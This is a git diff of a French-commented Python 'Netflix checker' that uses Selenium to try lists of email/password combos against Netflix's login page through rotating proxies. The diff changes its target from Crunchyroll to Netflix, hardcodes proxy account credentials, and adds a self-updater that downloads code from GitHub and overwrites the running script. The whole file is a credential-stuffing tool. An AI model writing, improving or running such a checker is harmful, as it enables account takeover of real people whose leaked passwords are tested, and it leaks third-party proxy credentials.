@@ -1,17 +1,18 @@
+# -*- coding: utf-8 -*-  # Indiquer l'encodage UTF-8
 import os
 import json
 import time
 import tkinter as tk
 from tkinter import filedialog
 import requests
-import shutil  # Pour remplacer les fichiers
+import shutil
 from selenium import webdriver
 from selenium.webdriver.common.by import By
 from selenium.webdriver.common.keys import Keys
 from selenium.webdriver.firefox.options import Options
 from colorama import Fore, Style, init
 import sys
-import subprocess  # Pour relancer le script
+import subprocess
 
 # Initialisation de Colorama
 init(autoreset=True)
@@ -20,10 +21,16 @@ init(autoreset=True)
 CURRENT_VERSION = "1.0.2"
 
 # URL du fichier texte qui contient la version la plus récente
-VERSION_URL = "https://raw.githubusercontent.com/Sukidadev/netflixchecker/refs/heads/main/latest_version.txt"
+VERSION_URL = "https://raw.githubusercontent.com/Sukidadev/netflixchecker/refs/heads/main/latest_version.txt"  # Remplacez par votre URL réelle
 
-# URL de téléchargement de la nouvelle version via l'API GitHub
-DOWNLOAD_URL = "https://raw.githubusercontent.com/Sukidadev/netflixchecker/main/netflixchecker.py"
+# URL de téléchargement de la nouvelle version
+DOWNLOAD_URL = "https://github.com/Sukidadev/netflixchecker/raw/main/netflixchecker.py"
+
+# Liste des proxys à utiliser
+proxies = [
+    "93291889-zone-custom-region-FR-sessid-DgtOgfNY-sessTime-60:0llEad0L@f.proxys5.net:6200",
+    "93291889-zone-custom-region-FR-sessid-PK0y3olo-sessTime-60:0llEad0L@f.proxys5.net:6200",
+]
 
 def center(var: str, space: int = None):
     if not space:
@@ -37,7 +44,7 @@ def print_ascii_art():
 ░ ▓██▄   ▓██  ▒██░▓███▄░ 
   ▒   ██▒▓▓█  ░██░▓██ █▄ 
 ▒██████▒▒▒▒█████▓ ▒██▒ █▄
-▒ ▒▓▒ ▒ ░░▒▓▒ ▒ ▒ ▒ ▒▒ ▓▒
+▒ ▒▓▒ ▒ ░░▒▓▒ ▒ ▒ ▒▒▒ ▓▒
 ░ ░▒  ░  ░░▒░ ░ ░ ░▒ ▒░
 ░  ░  ░   ░░░ ░ ░ ░░ ░ 
       ░     ░     ░  ░   
@@ -76,16 +83,21 @@ def check_version():
 
 def download_new_version():
     try:
-        # Récupérer le contenu du fichier via l'API GitHub
-        response = requests.get(DOWNLOAD_URL, headers={'Accept': 'application/vnd.github.v3.raw'})
+        # Télécharge la nouvelle version depuis l'URL
+        response = requests.get(DOWNLOAD_URL, stream=True)
         if response.status_code == 200:
-            # Sauvegarde la nouvelle version dans un fichier
-            script_path = sys.argv[0]
-            with open(script_path, 'wb') as f:
-                f.write(response.content)
+            # Sauvegarde la nouvelle version dans un fichier temporaire
+            new_version_path = "updated_script.py"
+            with open(new_version_path, 'wb') as f:
+                shutil.copyfileobj(response.raw, f)
             print(f"{Fore.GREEN}[INFO] Nouvelle version téléchargée avec succès.{Style.RESET_ALL}")
+
+            # Remplace l'ancienne version par la nouvelle
+            script_path = sys.argv[0]
+            shutil.move(new_version_path, script_path)
+            print(f"{Fore.GREEN}[INFO] Le script a été mis à jour.{Style.RESET_ALL}")
         else:
-            print(f"{Fore.RED}[ERROR] Impossible de télécharger la nouvelle version : {response.status_code}.{Style.RESET_ALL}")
+            print(f"{Fore.RED}[ERROR] Impossible de télécharger la nouvelle version.{Style.RESET_ALL}")
             exit(1)
     except requests.RequestException as e:
         print(f"{Fore.RED}[ERROR] Erreur lors du téléchargement de la nouvelle version : {e}{Style.RESET_ALL}")
@@ -103,9 +115,9 @@ def check_credentials(email, password, proxy):
     
     driver = webdriver.Firefox(options=options)
     
-    driver.get("https://sso.crunchyroll.com/fr/login")
+    driver.get("https://www.netflix.com/login")
     
-    username_field = driver.find_element(By.NAME, "email")
+    username_field = driver.find_element(By.NAME, "userLoginId")
     password_field = driver.find_element(By.NAME, "password")
     
     username_field.send_keys(email)
@@ -133,7 +145,7 @@ def run_script(file_path):
             for i, combo in enumerate(combos):
                 email = combo["email"]
                 password = combo["password"]
-                proxy = proxy[i % len(proxy)]
+                proxy = proxies[i % len(proxies)]
 
                 result = f"Test de connexion pour {email}:{password} via proxy {proxy}..."
                 print(result)
